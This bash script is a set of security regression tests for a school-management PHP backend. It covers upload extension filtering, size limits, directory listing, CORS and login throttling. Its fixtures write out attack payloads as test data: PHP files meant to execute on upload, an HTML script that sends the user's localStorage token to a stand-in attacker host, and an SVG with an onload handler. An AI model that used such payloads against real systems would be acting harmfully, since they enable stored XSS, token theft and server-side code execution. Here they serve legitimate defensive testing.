#!/usr/bin/env bash
# Security regression tests for the OTMS backend.
#
# Focuses on the file-upload surface: uploads land inside the web root, so an
# endpoint that accepts an executable extension (php, phtml, ...) or an
# HTML/SVG payload is a remote-code-execution / stored-XSS hole.
#
# Usage:  bash tools/api_security_test.sh
set -uo pipefail

PORT="${PORT:-8098}"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
BASE="http://127.0.0.1:$PORT/backend/api"
UPLOADS="$ROOT/backend/uploads"
BODY_FILE="$(mktemp)"
SERVER_LOG="$(mktemp)"
WORK="$(mktemp -d)"
PASS=0
FAIL=0

cleanup() {
  [ -n "${SERVER_PID:-}" ] && kill "$SERVER_PID" 2>/dev/null
  rm -rf "$WORK" "$BODY_FILE" "$SERVER_LOG"
}
trap cleanup EXIT

# An explicit production-style origin, to prove OTMS_ALLOWED_ORIGINS is honoured.
OTMS_ALLOWED_ORIGINS="https://otms.example.com" \
  php -S "127.0.0.1:$PORT" -t "$ROOT" >"$SERVER_LOG" 2>&1 &
SERVER_PID=$!
for _ in $(seq 1 60); do
  if curl -s -o /dev/null "http://127.0.0.1:$PORT/" 2>/dev/null; then break; fi
  sleep 0.25
done

CODE=""
BODY=""

api() { # METHOD PATH [JSON_BODY] [TOKEN]
  local method="$1" path="$2" data="${3:-}" token="${4:-}"
  local args=(-s -o "$BODY_FILE" -w '%{http_code}' -X "$method" "$BASE/$path")
  [ -n "$token" ] && args+=(-H "Authorization: Bearer $token")
  [ -n "$data" ] && args+=(-H 'Content-Type: application/json' -d "$data")
  CODE="$(curl "${args[@]}")"
  BODY="$(cat "$BODY_FILE")"
}

upload() { # PATH TOKEN FILE [FIELD=value ...]
  local path="$1" token="$2" file="$3"
  shift 3
  local args=(-s -o "$BODY_FILE" -w '%{http_code}' -X POST "$BASE/$path"
              -H "Authorization: Bearer $token" -F "file=@$file")
  for field in "$@"; do args+=(-F "$field"); done
  CODE="$(curl "${args[@]}")"
  BODY="$(cat "$BODY_FILE")"
}

json() {
  python3 -c "
import json,sys
try:
    d = json.load(sys.stdin)
except Exception:
    d = {}
print($1)
" <<<"$BODY" 2>/dev/null
}

check() { # NAME EXPECTED ACTUAL
  if [ "$2" = "$3" ]; then
    PASS=$((PASS + 1)); printf '  ok    %s\n' "$1"
  else
    FAIL=$((FAIL + 1))
    printf '  FAIL  %s\n        expected: %s\n        actual:   %s\n' "$1" "$2" "$3"
  fi
}

check_true() { check "$1" "true" "$([ "$2" = "$3" ] && echo true || echo false)"; }

# Runs a scalar SQL query through the project's own database configuration, so
# the scripts honour OTMS_DB_* and work on Windows too (where the mysql client
# is usually not on PATH). Prints the first column of the first row, or nothing
# if the query fails -- callers treat that as "unknown" rather than an error.
dbq() { # SQL
  php -r '
function fail($message = "", $code = 400) { fwrite(STDERR, $message); exit(1); }
require $argv[2];
try {
    $row = db()->query($argv[1])->fetch(PDO::FETCH_NUM);
    echo $row === false ? "" : $row[0];
} catch (Throwable $e) { fwrite(STDERR, $e->getMessage()); exit(1); }
' "$1" "$ROOT/backend/config.php" 2>/dev/null
}

# --- fixtures ---------------------------------------------------------------
printf '<?php echo "PWNED"; ?>' >"$WORK/payload.php"
printf '<?php echo "PWNED"; ?>' >"$WORK/payload.phtml"
printf '<script>fetch("//evil.test/"+localStorage.otms_token)</script>' >"$WORK/payload.html"
printf '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>' >"$WORK/payload.svg"
printf '%%PDF-1.4 legit homework' >"$WORK/homework.pdf"
printf 'PNGDATA' >"$WORK/photo.png"
head -c 12000000 /dev/zero >"$WORK/huge.pdf"

api POST login.php '{"email":"teacher@otms.test","password":"password"}'
TT=$(json "d.get('token','')")
api POST login.php '{"email":"student@otms.test","password":"password"}'
ST=$(json "d.get('token','')")

api POST class_create.php '{"name":"Sec Test Class","description":"s","color":"#6366F1"}' "$TT"
CLASS_ID=$(json "int(d.get('id',0))")
api POST enroll.php "{\"class_id\":$CLASS_ID}" "$ST"
api POST homework_create.php "{\"class_id\":$CLASS_ID,\"title\":\"Sec HW\",\"description\":\"d\"}" "$TT"
HW_ID=$(json "int(d.get('id',0))")
api POST lesson_create.php "{\"class_id\":$CLASS_ID,\"title\":\"Sec Lesson\"}" "$TT"
LESSON_ID=$(json "int(d.get('id',0))")

echo "== every upload attempt is made by a *student*, the least privileged role"

# --- executable extensions --------------------------------------------------
echo
echo "-- executable extensions (a student can submit homework)"
for ext in php phtml php5 phar; do
  cp "$WORK/payload.php" "$WORK/evil.$ext"
  upload submission_submit.php "$ST" "$WORK/evil.$ext" "homework_id=$HW_ID"
  check "upload .$ext as homework is rejected" "415" "$CODE"
  check_true "no .$ext file written to uploads/" "0" "$(find "$UPLOADS" -name "*.$ext" 2>/dev/null | wc -l | tr -d ' ')"
done

upload content_create.php "$ST" "$WORK/evil.php" "lesson_id=$LESSON_ID" "type=booklet" "title=x"
check "student cannot upload at all (teacher-only endpoint)" "403" "$CODE"

api POST login.php '{"email":"teacher@otms.test","password":"password"}'
TT=$(json "d.get('token','')")
upload content_create.php "$TT" "$WORK/evil.php" "lesson_id=$LESSON_ID" "type=booklet" "title=x"
check "upload .php as lesson material is rejected" "415" "$CODE"
check_true "no php file written to uploads/" "0" "$(find "$UPLOADS" -name '*.php' 2>/dev/null | wc -l | tr -d ' ')"

# --- active-content extensions (stored XSS from the app's own origin) -------
echo
echo "-- active content (would run script in the app's origin)"
for ext in html svg xhtml; do
  cp "$WORK/payload.html" "$WORK/active.$ext"
  upload submission_submit.php "$ST" "$WORK/active.$ext" "homework_id=$HW_ID"
  check "upload .$ext is rejected" "415" "$CODE"
  check_true "no .$ext file written to uploads/" "0" \
    "$(find "$UPLOADS" -name "*.$ext" 2>/dev/null | wc -l | tr -d ' ')"
done

# --- legitimate files still work -------------------------------------------
echo
echo "-- legitimate attachments still work"
upload submission_submit.php "$ST" "$WORK/homework.pdf" "homework_id=$HW_ID" "text=see attached"
check "upload .pdf is accepted" "201" "$CODE"
UPLOADED_PATH=$(dbq "SELECT file_path FROM submissions WHERE homework_id = $HW_ID ORDER BY id DESC LIMIT 1")
check_true "submission stores a file path" "true" "$([ -n "$UPLOADED_PATH" ] && echo true || echo false)"
check_true "stored name is randomised, not attacker-chosen" "true" \
  "$([ -f "$ROOT/backend/$UPLOADED_PATH" ] && echo true || echo false)"
check_true "stored name differs from the uploaded filename" "true" \
  "$([ "$(basename "$UPLOADED_PATH")" != "homework.pdf" ] && echo true || echo false)"

upload submission_submit.php "$ST" "$WORK/photo.png" "homework_id=$HW_ID"
check "upload .png is accepted" "201" "$CODE"

# --- size limit -------------------------------------------------------------
echo
echo "-- size limit"
upload submission_submit.php "$ST" "$WORK/huge.pdf" "homework_id=$HW_ID"
check "oversized upload is rejected" "413" "$CODE"

# --- storage location -------------------------------------------------------
echo
echo "-- uploads are not listable"
DIR_CODE=$(curl -s -o "$BODY_FILE" -w '%{http_code}' "http://127.0.0.1:$PORT/backend/uploads/")
check_true "directory index is not served" "true" \
  "$([ "$DIR_CODE" = "403" ] || [ "$DIR_CODE" = "404" ] && echo true || echo false)"

# --- CORS -------------------------------------------------------------------
echo
echo "-- CORS origins"
acao() { # ORIGIN -> the Access-Control-Allow-Origin header value, if any
  curl -s -o /dev/null -D - -H "Origin: $1" "$BASE/me.php" \
    | tr -d '\r' | awk 'tolower($1)=="access-control-allow-origin:"{print $2}'
}
check "localhost dev origin is allowed" "http://localhost:12345" "$(acao http://localhost:12345)"
check "Android emulator origin is allowed" "http://10.0.2.2:8080" "$(acao http://10.0.2.2:8080)"
check "configured origin is allowed" "https://otms.example.com" "$(acao https://otms.example.com)"
check "third-party origin gets no allow-origin header" "" "$(acao https://evil.test)"

# --- login throttling -------------------------------------------------------
echo
echo "-- login throttling"
# A dedicated address, so the real test accounts are not left locked out.
THROTTLE_EMAIL="nobody@otms.test"
dbq "DELETE FROM login_attempts WHERE email = '$THROTTLE_EMAIL'" >/dev/null
LAST=""
for _ in $(seq 1 10); do
  api POST login.php "{\"email\":\"$THROTTLE_EMAIL\",\"password\":\"guess\"}"
  LAST="$CODE"
done
check "guesses within the limit are rejected as bad credentials" "401" "$LAST"

api POST login.php "{\"email\":\"$THROTTLE_EMAIL\",\"password\":\"guess\"}"
check "next guess is throttled" "429" "$CODE"

api POST login.php '{"email":"teacher@otms.test","password":"password"}'
check "throttling one account does not block another" "200" "$CODE"

dbq "DELETE FROM login_attempts WHERE email = '$THROTTLE_EMAIL'" >/dev/null

printf '\n== %d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
